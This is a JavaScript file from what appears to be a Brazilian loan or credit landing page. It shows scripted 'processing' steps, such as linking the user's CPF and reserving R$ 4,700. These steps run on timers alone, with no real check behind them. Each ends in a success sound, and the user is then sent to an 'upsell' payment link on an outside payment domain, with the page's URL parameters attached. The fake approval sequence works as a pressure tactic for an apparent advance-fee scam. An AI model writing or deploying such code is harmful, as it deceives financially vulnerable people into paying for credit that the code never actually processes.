// Loading sequence controller
document.addEventListener('DOMContentLoaded', function() {
    startLoadingSequence();
});

function startLoadingSequence() {
    // Step 1: Vínculo de CPF
    setTimeout(() => {
        processStep(1, 'CPF Vinculado ✓', 1500);
    }, 500);
    
    // Step 2: Reserva de Limite
    setTimeout(() => {
        processStep(2, 'R$ 4.700,00 Reservado ✓', 2000);
    }, 2500);
    
    // Step 3: Abertura de Conta
    setTimeout(() => {
        processStep(3, 'Aguardando Ativação...', 1500);
    }, 5000);
    
    // Show upsell screen
    setTimeout(() => {
        showUpsellScreen();
    }, 7000);
}

function processStep(stepNumber, processingText, duration) {
    const step = document.getElementById(`step${stepNumber}`);
    const status = document.getElementById(`status${stepNumber}`);
    const loader = document.getElementById(`loader${stepNumber}`);
    
    if (!step) return;

    // Activate step
    step.classList.add('active');
    status.textContent = 'Processando...';
    if (loader) loader.style.display = 'block';
    
    // Complete step after duration
    setTimeout(() => {
        step.classList.remove('active');
        step.classList.add('completed');
        status.textContent = processingText;
        if (loader) loader.style.display = 'none';
        playSuccessSound();
    }, duration);
}

function playSuccessSound() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const gainNode = audioContext.createGain();
        oscillator.connect(gainNode);
        gainNode.connect(audioContext.destination);
        oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
        oscillator.frequency.setValueAtTime(1000, audioContext.currentTime + 0.1);
        gainNode.gain.setValueAtTime(0, audioContext.currentTime);
        gainNode.gain.linearRampToValueAtTime(0.1, audioContext.currentTime + 0.01);
        gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.2);
        oscillator.start(audioContext.currentTime);
        oscillator.stop(audioContext.currentTime + 0.2);
    } catch (e) {}
}

function showUpsellScreen() {
    const loadingScreen = document.getElementById('loadingScreen');
    const upsellScreen = document.getElementById('upsellScreen');
    
    loadingScreen.style.transition = 'opacity 0.5s ease';
    loadingScreen.style.opacity = '0';
    
    setTimeout(() => {
        loadingScreen.style.display = 'none';
        upsellScreen.style.display = 'block';
        upsellScreen.style.opacity = '0';
        upsellScreen.style.transition = 'opacity 0.5s ease';
        
        setTimeout(() => {
            upsellScreen.style.opacity = '1';
        }, 50);
        
        const content = document.querySelector('.upsell-content');
        content.style.transform = 'translateY(30px)';
        content.style.opacity = '0';
        content.style.transition = 'all 0.6s ease';
        
        setTimeout(() => {
            content.style.transform = 'translateY(0)';
            content.style.opacity = '1';
        }, 200);
    }, 500);
}

function redirectToAccountPayment() {
    const btn = event.currentTarget;
    btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSANDO...';
    btn.disabled = true;
    
    // O link de pagamento real do Upsell 01 (antigo 02)
    const paymentUrl = 'https://pay.pag-certo-online.shop/N1nVZpYow2AGlM6';
    const urlParams = new URLSearchParams(window.location.search);
    const finalUrl = paymentUrl + (paymentUrl.includes('?') ? '&' : '?') + urlParams.toString();
    
    setTimeout(() => {
        window.location.href = finalUrl;
    }, 1500);
}
